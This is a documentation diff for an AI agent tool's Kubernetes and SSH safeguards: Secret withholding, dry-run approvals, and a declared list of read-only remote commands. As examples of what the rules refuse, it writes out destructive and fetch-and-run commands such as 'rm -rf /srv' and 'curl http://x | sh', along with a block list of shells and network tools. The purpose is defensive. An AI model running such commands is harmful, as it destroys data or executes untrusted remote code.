@@ -29,14 +29,100 @@ Two tools, deliberately not one:
 
 | Tool | Approval | What it does |
 |---|---|---|
-| `k8s_get` | never prompts | list, describe, pod logs |
-| `k8s_apply` | **always prompts** | apply, delete, scale, restart |
+| `k8s_get` | never prompts | list, describe, pod logs, wait for a rollout |
+| `k8s_apply` | **always prompts** | apply, delete, scale, restart, rollback |
 
 Splitting them is what makes the safety real. Abhed's permission engine decides
 by tool name; a single tool with a `verb` argument would force it to parse an
 opaque string to tell `list pods` from `delete namespace`. As separate tools the
 read path is genuinely non-mutating, and every write goes through approval by
 construction rather than by correctly interpreting text.
+
+**A Secret's values never reach the model.** `k8s_get` of `secrets`, a
+single one or a list, and what the cluster answers a `k8s_apply` of a
+Secret, show each key of `data` and `stringData` with the value's length
+and a fingerprint in its place (`"tls.key": "[withheld: 1704 bytes,
+fingerprint 3f9a0c…, comparable only while this Abhed runs]"`), for `data`
+of the decoded value. The `kubectl.kubernetes.io/last-applied-configuration`
+annotation, which holds the whole object, is withheld too, and a response to
+a `secrets` read that is not JSON is not shown at all. The same text is what
+the record and every screen get. The fingerprint is an
+HMAC-SHA256 of the value under a random key Abhed makes when it starts and
+never writes anywhere, cut to 12 hex digits. Two fingerprints compare only
+while that Abhed process runs (a value changed by a write shows as a new
+fingerprint), and one in the record cannot be used to guess the value
+offline, as a plain sha256 of a short password could; nor can it be
+checked against a value outside Abhed. Keys and metadata are still read, so
+keep `k8s_get(*/*/secrets)` denied where even those matter.
+
+**Every write is dry-run first.** Before anyone is asked, `k8s_apply` sends
+the request it will make as a server-side dry run (`dryRun=All`), so the
+cluster's admission, validation and RBAC judge it, and reads the object as
+it stands. The approval then names what would change, field by field, after
+the cluster and the credential: `dry run: 2 field(s) change: spec.replicas:
+2 → 3; spec.template.spec.containers[0].image: "nginx:1.25" → "nginx:1.27"`,
+or `dry run: creates Deployment demo/web`. Status and metadata noise are
+left out, a Secret's values are shown only as length and fingerprint, and past
+20 fields the rest are counted. The same text is in `action.requested`.
+The request that was dry-run is the one sent once approved, byte for byte;
+a restart's timestamp included. A change the dry run refuses is refused
+before anyone is asked, with the cluster's reason, and nothing is applied:
+the model reads `the cluster's dry run of this change failed, so it was not
+applied: …`. A call a rule denies reaches no cluster, not even for a dry run.
+
+**Secrets without the model.** A Secret written as a manifest would carry
+its values in the call, where the rules, the approval and the record read
+them. So a `manifest` that is, or holds, a Secret with `data` or
+`stringData` is refused before any rule reads it, its values are withheld
+from the record (as length and fingerprint), and the model is told to use
+`secret_from`; so is a manifest that is not JSON and may hold one. A Secret
+without values (to set a label, say) is applied as any manifest is.
+`secret_from` builds the Secret instead, from values Abhed reads itself:
+
+```json
+{"action": "apply", "namespace": "web",
+ "secret_from": {"name": "site-tls", "type": "kubernetes.io/tls",
+   "data": {"tls.crt": {"file": "/work/certs/site.crt"},
+            "tls.key": {"secret": "SITE_TLS_KEY"}}}}
+```
+
+Each key comes from a stored secret, by NAME (`abhed secret set
+SITE_TLS_KEY`), or from a workspace file, by absolute path; `type` is
+`Opaque` (the default) or `kubernetes.io/tls`, which needs `tls.crt` and
+`tls.key` and checks that each is a PEM certificate or private key. Each
+stored secret needs its own `allow secret(NAME)` rule, as every secret use
+does, and each file is judged as a `read` of it would be, so
+`deny read(*.key)` holds here too. The rules read the call as an `apply` of
+a Secret in its namespace, and the manifest they, the approver and the
+record see is the Secret without its values. The approval names each
+source with its value's length, and a workspace file's sha256 or a stored
+secret's fingerprint:
+`builds Secret site-tls (kubernetes.io/tls) with tls.crt from file
+/work/certs/site.crt [1310 bytes, sha256 …], tls.key from stored
+secret SITE_TLS_KEY [withheld: 1704 bytes, fingerprint …]`. The dry run
+before it sends placeholders, so no value leaves Abhed before a person says
+yes, and the diff compares the live Secret's values with the ones read by
+fingerprint. A
+source that cannot be read, a certificate that is not one, values over
+1 MiB in all, or a call with both a `manifest` and `secret_from` is refused
+before anyone is asked, naming the source and never its content.
+
+**Rollouts.** `k8s_apply` with `action: "rollback"`, `resource:
+"deployments"` and a `name` does what `kubectl rollout undo` does: it puts
+the pod template of the Deployment's previous revision back (or of
+`revision` when the call names one), read from the ReplicaSets the
+Deployment owns. It asks like any write, its dry run shows the template
+fields that change, and the patch first tests the Deployment's
+`resourceVersion`, so a Deployment changed since the approval is refused,
+not rolled back to a revision no one saw. A paused Deployment is refused.
+Rules read it as `cluster/namespace/rollback`: a rule on `restart` or
+`apply` does not cover it, and `k8s_apply(prod/*)` does.
+
+`k8s_get` with `resource: "deployments"`, a `name` and `wait_seconds`
+(at most 600) waits for that Deployment's rollout, reading it every two
+seconds, and says whether it finished, failed on its progress deadline, or
+was still going when the wait ended, with the replica counts, as
+`kubectl rollout status` does. It is a read and never prompts.
 
 `allow_writes` decides whether `k8s_apply` exists at all. Even with it on, there
 is no permission mode that auto-approves a cluster write: a mistaken delete in
@@ -227,9 +313,13 @@ a cluster only by naming a context you already have, so the worst it can reach
 is what your own `kubectl` can. Token, tokenFile, client certificates and `exec`
 credential helpers (the cloud CLIs) all work; exec tokens are refreshed before
 they expire, because an expired token returns a 401 that reads like a
-permissions problem. An `exec` helper runs only when Abhed sends a request:
-never while a `k8s_apply` waits for approval, and never for a call that is
-denied or refused in plan mode.
+permissions problem. An `exec` helper runs only when Abhed sends a request for a call that
+may run: never while a `k8s_apply` waits for approval, and never for a call
+that is denied or refused in plan mode. So a write to a kubeconfig context
+whose helper has not run yet is asked about without a dry run, and the
+approval says `no dry run: the kubeconfig's credential helper has not run
+yet`; once a call has run it, later writes are dry-run with its token
+until the token is close to expiring.
 
 Abhed talks to the API directly rather than importing `client-go`, which would
 add roughly a hundred transitive dependencies to a bundle where each one is
@@ -311,12 +401,169 @@ retry with `accept_host_key: true` **only if the user has said the host is new
 or ephemeral**. That is a deliberate line: the agent should not decide on its
 own to stop verifying the identity of a machine it is about to run commands on.
 
-**Every remote command requires approval — there is no read-only classification.**
+**Every remote command requires approval unless the operator declared it a read.**
 A local `bash` call can be judged by its text because it runs inside a sandbox
 with a workspace boundary and a checkpoint behind it. None of that holds over
 SSH: the command runs with the remote account's full authority, outside any
 scoping, with no undo. Calling `cat` safe there would be judging the string
-rather than the consequence.
+rather than the consequence, so Abhed does not do it on its own.
+
+The operator can, for the commands they know are reads on their machines,
+with `ssh.read_commands`: a list of exact commands, or patterns for one
+simple command, matched on every host.
+
+```json
+"ssh": { "enabled": true, "read_commands": [
+  "uptime", "df -h", "systemctl status *",
+  "openssl x509 -enddate -noout -in /etc/nginx/tls/site.crt"
+] }
+```
+
+A call whose command is one simple command matching an entry is a read: plan
+mode allows it, so a plan can start by inspecting the fleet, and no mode asks
+for it. Everything else is as before. The command must be one simple command,
+read as bash reads it: `uptime; rm -rf /srv`, `uptime | sh`,
+`systemctl status $(id)`, a redirection, a line the parser cannot read in
+full and one the destructive step names are not reads, and plan mode refuses
+them. Nor is a call in which the parser finds another command
+(`su -c '…' root`, `sh -c …`, `sudo cat …`, `eval`), one that writes a file
+it can name (`tee`, `cp`, `find -fprint`), or one that carries a
+`stdin_secret`: the secret could come back in the output in a form the mask
+does not catch (`head -c 3`, `base64`). Deny and ask rules come first. In
+`bypass` mode the read step is not used: bypass allows the call anyway, and
+where the managed configuration refuses bypass, the call asks as in default
+mode, a declared read included.
+
+**Exact entries.** An entry with no `*` or `?` matches only its own text, so
+it is the operator's own command: declare only commands you have read and
+know to be reads on your hosts. Known runners are refused, in any case of
+their name: shells (`sh`, `bash`, `zsh`, `busybox`, `source`, `eval`, …),
+runners (`sudo`, `su`, `doas`, `env`, `nice`, `timeout`, `xargs`, `nsenter`,
+`systemd-run`, `setpriv`, `prlimit`, `capsh`, `setarch`, `run-parts`,
+`start-stop-daemon`, `sshpass`, `runcon`, `bwrap`, `fakeroot`, `chpst`,
+`proot`, `unbuffer`, `docker`, `kubectl`, `ssh`, the dynamic loader `ld.so`
+and `ld-linux*.so`, …), interpreters (`python`, `perl`, `ruby`, `node`,
+`java`, `go`, `julia`, `R`, `awk`, `m4`, `dc`, …), and clients with a
+command that runs one (`socat`, `nc`, `sqlite3`, `psql`, `mysql`,
+`redis-cli`, `ansible`, `git`, `find`, `nginx`, …). No such list is
+complete, so the list is a backstop, not the review. Where the program is
+on the list below, the entry must also be a read form of it.
+
+**Wildcard entries.** An entry with `*` or `?` is accepted only for a program
+on this list, named as written (its path dropped), and only in a read form of
+it; any other is refused at load with "declare the exact command instead".
+Every call the pattern matches is checked against the same form, so an
+option or verb that is not a read is never approved through a wildcard,
+whatever the pattern says.
+
+A form names the **options it allows**; every other option is refused. A
+long option is matched only in full, so an abbreviation getopt would take
+(`--vac=1` for `--vacuum-size`) is refused, and a cluster of short ones
+(`-Tc`) is refused unless the cluster itself is listed. For an option that
+takes a value, the value is the next word, the text after `=`, or, for a
+short option of a getopt program, the rest of the word (`-n50`); a next
+word that starts with `-` is judged as an option of its own, never skipped
+as a value. Where a program has **verbs**, the verb must be the first word
+after the program, in the entry and in every call, with no option before
+it, so no option's value can be taken for the verb. In an entry, a wildcard
+may stand for an operand or for a value after `=`, never for an option.
+
+Every program on the list has a form; there is no "any arguments" entry,
+since programs as plain as `lspci` have options that write (`-O`) or reach
+the network (`-q`). A call with a `$` outside single quotes is not a read,
+nor is one with an unquoted `*`, `?` or `[` at the start of a word or in a
+word that starts with `-`, since the host's shell could expand it into an
+option: write the glob after a path (`/etc/nginx/*.conf`, `./*.log`). A value
+in single quotes may hold `$` and braces only for `dpkg-query -f` and
+`rpm --queryformat`, which take a format. A call with a backslash inside
+single quotes is not a read: POSIX shells keep it as written and fish reads
+`\'` as a kept quote, so the words would depend on the remote login shell.
+A program marked **content reader** prints the files it is given, so a
+wildcard entry for it reads any file the remote account can.
+
+| Program | Read form a wildcard may cover |
+|---|---|
+| `cat` | **content reader**; options `--number-nonblank`, `--number`, `--show-all`, `--show-ends`, `--show-nonprinting`, `--show-tabs`, `--squeeze-blank`, `-A`, `-E`, `-T`, `-b`, `-e`, `-n`, `-s`, `-t`, `-u`, `-v` |
+| `head` | **content reader**; options `--quiet`, `--silent`, `--verbose`, `--zero-terminated`, `-q`, `-v`, `-z`; values `--bytes`, `--lines`, `-c`, `-n` |
+| `tail` | **content reader**; options `--follow=descriptor`, `--follow=name`, `--follow`, `--quiet`, `--retry`, `--silent`, `--verbose`, `--zero-terminated`, `-F`, `-f`, `-q`, `-v`, `-z`; values `--bytes`, `--lines`, `--max-unchanged-stats`, `--pid`, `--sleep-interval`, `-c`, `-n`, `-s` |
+| `cut` | **content reader**; options `--complement`, `--only-delimited`, `--zero-terminated`, `-s`, `-z`; values `--bytes`, `--characters`, `--delimiter`, `--fields`, `--output-delimiter`, `-b`, `-c`, `-d`, `-f` |
+| `cmp` | **content reader**; options `--print-bytes`, `--quiet`, `--silent`, `--verbose`, `-b`, `-bl`, `-l`, `-lb`, `-s`; values `--bytes`, `--ignore-initial`, `-i`, `-n` |
+| `diff` | **content reader**; options `--brief`, `--color=always`, `--color=never`, `--context`, `--expand-tabs`, `--ignore-all-space`, `--ignore-blank-lines`, `--ignore-case`, `--ignore-space-change`, `--new-file`, `--recursive`, `--report-identical-files`, `--show-c-function`, `--side-by-side`, `--strip-trailing-cr`, `--suppress-common-lines`, `--text`, `--unified`, `-B`, `-E`, `-N`, `-Naur`, `-Nru`, `-Z`, `-a`, `-b`, `-c`, `-i`, `-p`, `-q`, `-qr`, `-rN`, `-r`, `-rq`, `-ru`, `-s`, `-t`, `-u`, `-urN`, `-ur`, `-w`, `-y`; values `--exclude`, `--from-file`, `--ignore-matching-lines`, `--label`, `--starting-file`, `--to-file`, `--width`, `-C`, `-I`, `-S`, `-U`, `-W`, `-x` |
+| `zcat` | **content reader**; options `--force`, `--list`, `--quiet`, `--verbose`, `-f`, `-l`, `-q`, `-v` |
+| `grep`, `egrep`, `fgrep` | **content reader**; options `--basic-regexp`, `--binary`, `--byte-offset`, `--color=always`, `--color=never`, `--count`, `--dereference-recursive`, `--extended-regexp`, `--files-with-matches`, `--files-without-match`, `--fixed-strings`, `--ignore-case`, `--initial-tab`, `--invert-match`, `--line-buffered`, `--line-number`, `--line-regexp`, `--no-filename`, `--no-messages`, `--null-data`, `--null`, `--only-matching`, `--perl-regexp`, `--quiet`, `--recursive`, `--silent`, `--text`, `--with-filename`, `--word-regexp`, `-E`, `-Ei`, `-Ev`, `-F`, `-Fi`, `-G`, `-H`, `-Hn`, `-I`, `-L`, `-P`, `-R`, `-T`, `-U`, `-Z`, `-a`, `-b`, `-c`, `-cv`, `-h`, `-iE`, `-iF`, `-i`, `-in`, `-iv`, `-iw`, `-l`, `-lr`, `-nH`, `-n`, `-ni`, `-o`, `-q`, `-r`, `-ri`, `-ril`, `-rin`, `-rl`, `-rn`, `-rni`, `-rw`, `-s`, `-vE`, `-v`, `-vi`, `-w`, `-wi`, `-x`, `-z`; values `--after-context`, `--before-context`, `--binary-files`, `--context`, `--devices`, `--directories`, `--exclude-dir`, `--exclude`, `--file`, `--include`, `--label`, `--max-count`, `--regexp`, `-A`, `-B`, `-C`, `-D`, `-d`, `-e`, `-f`, `-m` |
+| `ls` | options `--all`, `--almost-all`, `--classify`, `--color=always`, `--color=auto`, `--color=never`, `--context`, `--dereference`, `--directory`, `--full-time`, `--group-directories-first`, `--human-readable`, `--inode`, `--no-group`, `--numeric-uid-gid`, `--quote-name`, `--recursive`, `--reverse`, `--si`, `--size`, `-1`, `-1a`, `-A`, `-Al`, `-C`, `-F`, `-G`, `-H`, `-L`, `-Q`, `-R`, `-S`, `-U`, `-X`, `-Z`, `-a1`, `-a`, `-al`, `-alh`, `-d`, `-dl`, `-g`, `-h`, `-hal`, `-hl`, `-i`, `-lA`, `-lR`, `-lS`, `-lSh`, `-l`, `-la`, `-lah`, `-lai`, `-lart`, `-latr`, `-ld`, `-lh`, `-lha`, `-lrt`, `-ls`, `-lt`, `-lth`, `-ltr`, `-ltrh`, `-m`, `-n`, `-o`, `-p`, `-r`, `-rtl`, `-s`, `-sl`, `-t`, `-tl`, `-v`, `-x`; values `--block-size`, `--format`, `--hide`, `--ignore`, `--indicator-style`, `--quoting-style`, `--sort`, `--tabsize`, `--time-style`, `--time`, `--width`, `-I`, `-T`, `-w` |
+| `stat` | options `--dereference`, `--file-system`, `--terse`, `-L`, `-f`, `-t`; values `--format`, `--printf`, `-c` |
+| `df` | options `--all`, `--human-readable`, `--inodes`, `--local`, `--portability`, `--print-type`, `--si`, `--total`, `-H`, `-P`, `-Ph`, `-T`, `-Th`, `-a`, `-hT`, `-h`, `-hi`, `-hl`, `-i`, `-ih`, `-k`, `-l`, `-lh`; values `--block-size`, `--exclude-type`, `--output`, `--type`, `-B`, `-t`, `-x` |
+| `free` | options `--bytes`, `--committed`, `--gibi`, `--giga`, `--human`, `--kibi`, `--kilo`, `--lowhi`, `--mebi`, `--mega`, `--pebi`, `--si`, `--tebi`, `--tera`, `--total`, `--wide`, `-b`, `-g`, `-h`, `-ht`, `-hw`, `-k`, `-l`, `-m`, `-t`, `-th`, `-v`, `-w`, `-wh`; values `--count`, `--seconds`, `-c`, `-s` |
+| `uptime` | options `--pretty`, `--since`, `-p`, `-s`; no operand |
+| `uname` | options `--all`, `--hardware-platform`, `--kernel-name`, `--kernel-release`, `--kernel-version`, `--machine`, `--nodename`, `--operating-system`, `--processor`, `-a`, `-i`, `-m`, `-mrs`, `-n`, `-o`, `-p`, `-r`, `-rs`, `-s`, `-snrvm`, `-sr`, `-srm`, `-v`; no operand |
+| `id` | options `--group`, `--groups`, `--name`, `--real`, `--user`, `--zero`, `-G`, `-Gn`, `-g`, `-gn`, `-nG`, `-n`, `-ng`, `-nu`, `-r`, `-ru`, `-u`, `-un`, `-ur`, `-z` |
+| `whoami` | no options; no operand |
+| `groups` | no options |
+| `nproc` | options `--all`; values `--ignore`; no operand |
+| `ps` | options `--forest`, `--headers`, `--no-headers`, `-A`, `-F`, `-H`, `-L`, `-M`, `-N`, `-T`, `-Z`, `-a`, `-aux`, `-d`, `-eF`, `-eLf`, `-e`, `-efH`, `-ef`, `-ejH`, `-elf`, `-ely`, `-eo`, `-f`, `-j`, `-l`, `-w`, `-ww`, `-y`; values `--cols`, `--columns`, `--format`, `--group`, `--pid`, `--ppid`, `--quick-pid`, `--rows`, `--sid`, `--sort`, `--tty`, `--user`, `--width`, `-C`, `-G`, `-O`, `-U`, `-g`, `-o`, `-p`, `-q`, `-s`, `-t`, `-u`; operands only `aux`, `auxf`, `auxw`, `auxww`, `ax`, `axf`, `axjf`, `axo`, `axu`, `f`, `faux`, `uax` (not `e`, which prints each process's environment) |
+| `pgrep` | options `--count`, `--exact`, `--full`, `--ignore-case`, `--inverse`, `--lightweight`, `--list-full`, `--list-name`, `--newest`, `--oldest`, `-a`, `-af`, `-ai`, `-c`, `-f`, `-fa`, `-fl`, `-i`, `-ia`, `-l`, `-lf`, `-n`, `-o`, `-v`, `-w`, `-x`; values `--delimiter`, `--euid`, `--group`, `--parent`, `--pgroup`, `--session`, `--terminal`, `--uid`, `-G`, `-P`, `-U`, `-d`, `-g`, `-s`, `-t`, `-u` |
+| `netstat` | options `--all`, `--extend`, `--interfaces`, `--listening`, `--numeric`, `--program`, `--raw`, `--route`, `--statistics`, `--tcp`, `--timers`, `--udp`, `--unix`, `--wide`, `-4`, `-6`, `-W`, `-a`, `-an`, `-anp`, `-ant`, `-antp`, `-atn`, `-e`, `-i`, `-ia`, `-ie`, `-l`, `-lnp`, `-lntp`, `-ltn`, `-ltnp`, `-n`, `-nr`, `-o`, `-p`, `-r`, `-rn`, `-s`, `-st`, `-su`, `-t`, `-tln`, `-tlnp`, `-tulnp`, `-tulpn`, `-tunlp`, `-u`, `-w`, `-x`; no operand |
+| `lsblk` | options `--all`, `--bytes`, `--fs`, `--inverse`, `--json`, `--list`, `--nodeps`, `--noheadings`, `--output-all`, `--paths`, `--perms`, `--raw`, `--scsi`, `--topology`, `--zoned`, `-J`, `-O`, `-S`, `-a`, `-b`, `-d`, `-dn`, `-f`, `-fp`, `-l`, `-m`, `-n`, `-nd`, `-no`, `-p`, `-pf`, `-r`, `-s`, `-t`, `-z`; values `--exclude`, `--include`, `--output`, `--sort`, `-I`, `-e`, `-o`, `-x` |
+| `lscpu` | options `--all`, `--extended`, `--hex`, `--json`, `--offline`, `--online`, `--parse`, `--physical`, `-J`, `-a`, `-b`, `-c`, `-e`, `-p`, `-x`, `-y` |
+| `lsmem` | options `--all`, `--bytes`, `--json`, `--noheadings`, `--pairs`, `--raw`, `--summary`, `-J`, `-P`, `-a`, `-b`, `-n`, `-r`; values `--output`, `--split`, `-o` |
+| `lsmod` | no options; no operand |
+| `lspci` | options `-D`, `-b`, `-k`, `-knn`, `-m`, `-mm`, `-n`, `-nn`, `-nnk`, `-nnv`, `-t`, `-tv`, `-v`, `-vnn`, `-vt`, `-vv`, `-vvv`; values `-d`, `-s`; no operand |
+| `w` | options `--from`, `--ip-addr`, `--no-header`, `--old-style`, `--short`, `-f`, `-h`, `-i`, `-o`, `-s`, `-u` |
+| `who` | options `--all`, `--boot`, `--count`, `--dead`, `--heading`, `--login`, `--lookup`, `--mesg`, `--message`, `--runlevel`, `--short`, `--time`, `--users`, `--writable`, `-H`, `-T`, `-a`, `-b`, `-d`, `-l`, `-m`, `-q`, `-r`, `-s`, `-t`, `-u`, `-w` |
+| `getent` | options `--no-idn`, `-i` |
+| `vmstat` | options `--active`, `--disk-sum`, `--disk`, `--forks`, `--one-header`, `--slabs`, `--stats`, `--timestamp`, `--wide`, `-D`, `-a`, `-d`, `-f`, `-m`, `-n`, `-s`, `-t`, `-w`; values `--count`, `--partition`, `--unit`, `-S`, `-c`, `-p` |
+| `basename` | options `--multiple`, `--zero`, `-a`, `-z`; values `--suffix`, `-s` |
+| `dirname` | options `--zero`, `-z` |
+| `realpath` | options `--canonicalize-existing`, `--canonicalize-missing`, `--logical`, `--no-symlinks`, `--physical`, `--quiet`, `--strip`, `--zero`, `-L`, `-P`, `-e`, `-m`, `-q`, `-s`, `-z`; values `--relative-base`, `--relative-to` |
+| `readlink` | options `--canonicalize-existing`, `--canonicalize-missing`, `--canonicalize`, `--no-newline`, `--quiet`, `--silent`, `--verbose`, `--zero`, `-e`, `-f`, `-m`, `-n`, `-q`, `-s`, `-v`, `-z` |
+| `file` | options `-b`, `-L`, `-h`, `-i`, `--mime`, `--mime-type`, `--mime-encoding`, `-k`, `-s`, `-E`, `-N`, `-0`, `-r` and their long forms; values `-F`, `-e` (not `-m`, whose magic file it echoes line by line; not `-C`, which writes, or `-z`/`-Z`, which run decompressors) |
+| `wc` | options `-c`, `-m`, `-l`, `-L`, `-w` and their long forms; value `--total` (not `--files0-from`, which echoes another file's lines as names) |
+| `du` | options `-a`, `-b`, `-c`, `-h`, `-k`, `-m`, `-s`, `-x`, `-L`, `-P`, `-l`, `-S`, `-0`, the clusters `-sh`, `-hs`, `-ah`, `-ha`, `-sch`, `-csh`, `-hc`, `-ch`, `-sk`, `-sm`, `-xsh`, and long forms; values `-d`, `-t`, `--time-style`, `-B`, `--exclude` (not `--files0-from` or `-X`) |
+| `md5sum`, `sha1sum`, `sha224sum`, `sha256sum`, `sha384sum`, `sha512sum`, `b2sum` | options `-b`, `-t`, `--tag`, `-z` and their long forms (not `-c`, which reads a list from another file) |
+| `cksum` | options `--base64`, `--raw`, `--tag`, `--untagged`, `-z`; values `-a`, `-l` (not `--check`) |
+| `findmnt` | options `-l`, `-n`, `-J`, `-r`, `-a`, `-D`, `-b`, `-u`, `-s`, `-m`, `-k`, `-A`, `-f`, `-v` and long forms; values `-o`, `-t`, `-T`, `-S`, `-O`, `-M` (not `-F`, which parses another file as a table) |
+| `lsusb` | options `-v`, `-t`; values `-s`, `-d` (not `-D`, which dumps a file) |
+| `rg` | options `-n`, `-N`, `-i`, `-S`, `-s`, `-w`, `-x`, `-v`, `-l`, `-c`, `-F`, `-H`, `-u`, `-uu`, `-L`, `-o`, `-U`, `-P`, `-q`, `-a` and long forms such as `--no-heading`, `--hidden`, `--files`, `--json`; values `-e`, `-g`, `--iglob`, `-t`, `-T`, `-A`, `-B`, `-C`, `-m`, `-d`, `--max-filesize`, `-E`, `--sort` (not `--pre` or `-z`, which run programs) |
+| `sort` | options `-n`, `-r`, `-u`, `-h`, `-V`, `-f`, `-b`, `-M`, `-g`, `-s`, `-z`, `-c`, `-C`, `-d`, `-i`, `-R` and their long forms; values `-k`, `-t`, `-S`, `--parallel` (not `-o`, `-T` or `--compress-program`) |
+| `date` | options `-u`, `-R`, `-I` and its `-Idate`…`-Ins` forms, `--iso-8601` and `--rfc-3339` with a value; values `-d`, `-r`; each operand starts with `+` |
+| `hostname` | options `-f`, `-s`, `-i`, `-I`, `-d`, `-a`, `-A` and their long forms; no operand |
+| `dmesg` | options `-T`, `-H`, `-k`, `-u`, `-x`, `-t`, `-w`, `-W`, `-P`, `-r`, `-J`, `-e`, `-d`, `-S`, `-L` and their long forms; values `-l`, `-f`, `--since`, `--until`, `--time-format` |
+| `journalctl` | options `-b`, `-k`, `--no-pager`, `-r`, `-x`, `-f`, `-q`, `-a`, `--no-hostname`, `--utc`, `-N`, `--system`, `--user`, `--list-boots`, `--disk-usage`, `--header`, `--show-cursor`, `--no-full`, `-l`, `-m` and long forms; values `-u`, `--user-unit`, `-n`, `-p`, `-S`, `-U`, `-o`, `--output-fields`, `-g`, `-t`, `-T`, `-F`, `-D`, `--file`, `--cursor`, `--after-cursor` (not `--cursor-file`, `--vacuum-*`, `--rotate` and the other options that write) |
+| `systemctl` | first word `status`, `show`, `cat`, `is-active`, `is-enabled`, `is-failed`, `list-units`, `list-unit-files`, `list-timers`, `list-sockets` or `list-dependencies`; then options `--no-pager`, `-l`, `-a`, `--value`, `--no-legend`, `--plain`, `-q`, `--user`, `--system`, `-r`, `--reverse`, `--before`, `--after` and long forms; values `-n`, `-o`, `-p`, `-t`, `--state` |
+| `hostnamectl` | first word `status`; options `--static`, `--transient`, `--pretty` |
+| `timedatectl` | first word `status` or `show`; options `-a`, `--value`; value `-p` |
+| `ip` | options before the object, as ip takes them: `-4`, `-6`, `-0`, `-o`, `-br`, `-s`, `-d`, `-j`, `-p`, `-c`, `-h`, `-iec`, `-r` and their full spellings, value `-f`; then object `addr`, `address`, `a`, `link`, `l`, `route`, `r`, `neigh`, `neighbour`, `n`, `rule` or `maddr`, then nothing or `show`, `list`, `ls`, `lst` or `get`; never `netns`, `exec` or `vrf`. ip takes any prefix of an option (`-ba` is `-batch`), so only these, as written, are read |
+| `openssl` | first word `x509` (options `-noout`, `-text`, `-enddate`, `-startdate`, `-dates`, `-subject`, `-issuer`, `-serial`, `-fingerprint`, `-sha1`, `-sha256`, `-md5`, `-purpose`, `-hash`, `-subject_hash`, `-issuer_hash`, `-email`, `-ocsp_uri`, `-pubkey`, `-modulus`, `-ext_all`; values `-in`, `-inform`, `-checkend`, `-nameopt`, `-ext`, `-certopt`, `-dateopt`), `s_client` (options `-showcerts`, `-verify_return_error`, `-brief`, `-tls1_2`, `-tls1_3`, `-no_ign_eof`, `-quiet`, `-status`, `-crlf`; values `-connect`, `-servername`, `-CAfile`, `-CApath`, `-verify`, `-alpn`, `-starttls`, `-proxy`, `-host`, `-port`; it connects from the host to the address it is given, so it is a way out of the host as well as a read), `verify` (options `-verbose`, `-show_chain`, `-crl_check`, `-crl_check_all`, `-partial_chain`, `-x509_strict`; values `-CAfile`, `-CApath`, `-untrusted`, `-purpose`, `-CRLfile`) or `version`; one dash or two |
+| `docker`, `podman` | first word `ps` (options `-a`, `-q`, `--no-trunc`, `-l`, `-s`; values `-n`, `-f`, `--format`), `images` (options `-a`, `-q`, `--no-trunc`, `--digests`; values `-f`, `--format`), `inspect` (option `-s`; values `-f`, `--type`), `logs` (options `-f`, `-t`, `--details`; values `-n`, `--since`, `--until`), `version` or `info` (value `-f`); no global option such as `-H` |
+| `apt` | first word `list` (options `--installed`, `--upgradable`, `-a`), `show` (option `-a`), `policy` or `search` (options `--names-only`, `--full`) |
+| `apt-cache` | first word `policy`, `show`, `search`, `depends` or `rdepends`; options `--names-only`, `--full`, `--installed`, `--recurse`, `-i` |
+| `dpkg` | options `-l`, `-s`, `-L`, `-S`, `-p`, `--get-selections` and their long forms |
+| `dpkg-query` | options `-l`, `-W`, `-s`, `-L`, `-S` and their long forms; value `-f` |
+| `rpm` | options `-q`, `-qa`, `-qi`, `-ql`, `-qf`, `-qc`, `-qd`, `-qR`, `-qai`, `--query`, `--all`, `--info`, `--list`, `--file`, `--requires`, `--provides`, `--whatprovides`, `--whatrequires`, `--changelog`, `--last`; value `--queryformat`, without `:expand` or `%(`, which run macros |
+
+A reader on the list reads any file the remote account can, and `getent`
+asks the host's resolver, which may query DNS: narrow the path or name in the
+pattern (`cat /var/log/*`, `getent hosts web*`) to what you mean.
+
+Not on the list, so declared exactly or not at all: `find`, `mount`, `ss`
+(the parser reads its operand as a command), `lsof`, `curl`, `wget`,
+`nginx`, `kubectl`, `git`, and every program that runs another. `*` matches
+any text, spaces included, so `ip addr *` does not match `ip addr` alone;
+write both if both are wanted.
+
+The `ssh` tool's description lists the entries, so the model knows which
+commands it may run in plan mode.
+
+Only a trusted configuration file sets `ssh.read_commands`; a workspace
+cannot. A managed file that sets it replaces the list (`[]` allows none), and
+one that sets any `permissions` key without it sets the person's entries
+aside, as it does their allow rules.
+
+A [runbook](../guide/28-runbooks.md) is the one way to approve remote commands
+ahead of time: the person reads each exact command once, with the plan, and
+only a call made exactly as the next step runs without its own ask. Deny
+rules still refuse it.
 
 The agent can name a host from this list, or one the user gave `ssh_connect`
 in the same session with approval. It cannot introduce one on its own.
@@ -327,13 +574,79 @@ Permission rules and "always allow" read an `ssh` call as `host/command`,
 so a rule or an answer for one host never covers another:
 `ssh(build1/*)` allows every command on `build1` and nothing elsewhere, and
 "don't ask again" for `uptime` on `build1` offers `ssh(build1/uptime)`.
-Deny and ask rules also read the command alone, so `ssh(rm *)` still stops
-`rm` on every host.
+The command is read as a `bash` command is, since the remote shell runs it.
+Deny and ask rules see each command in a chain, pipe or substitution and
+behind a runner such as `sudo`, `env` or `nice`, alone and as `host/command`,
+so `ssh(rm *)` stops `rm -rf /srv`, `true; rm -rf /srv` and
+`sudo rm -rf /srv` on every host. An allow rule with a pattern approves only
+one simple command: `ssh(web1/openssl x509 *)` approves
+`openssl x509 -enddate -noout -in site.crt` and not
+`openssl x509 -in a.pem; rm -rf /var/www` or `... && curl http://x | sh`,
+which ask. While a deny rule for `ssh` has a pattern, a line the parser
+cannot read in full (an open quote, a trailing `|`, `eval "$x"`) is
+refused. A command the destructive step names (`rm -rf`, `dd of=`, a force
+push) always confirms twice and offers no "always", in every mode. The rules
+cannot see inside a script the command runs on the host (`./deploy.sh`), and
+the command is read as bash reads it, whatever the remote login shell is.
 
 ```json
 "deny":  ["ssh(db1/*)", "ssh(rm *)"],
 "allow": ["ssh(build1/uptime)"]
 ```
+
+**A secret on the remote command's stdin.** A command that needs a
+password or a key (`sudo -S`, `chpasswd`, `cat > /etc/app/key`) takes it
+from the secrets store: store it with `abhed secret set DB_PW`, allow
+`secret(DB_PW)`, and the agent passes `"stdin_secret": "DB_PW"` beside the
+command. The value is written to the command's stdin, with a final newline
+if it has none, and is never in the command line, the approval or the
+arguments the model sees: the approval names it (`writes stored secret DB_PW
+to the command's stdin`), and output that prints it literally comes back as
+`[secret DB_PW]`. Output that transforms it (`head -c 3`, `base64`, a hash)
+is not masked, so use it with commands that do not print what they read; a
+call with `stdin_secret` is never a declared read. The rules read the call as they read any `ssh` call, by
+`host/command`, and the secret needs its own rule in every mode.
+
+### Moving files to and from a host
+
+With `"transfers": true`, `ssh_put` and `ssh_get` move one file at a time
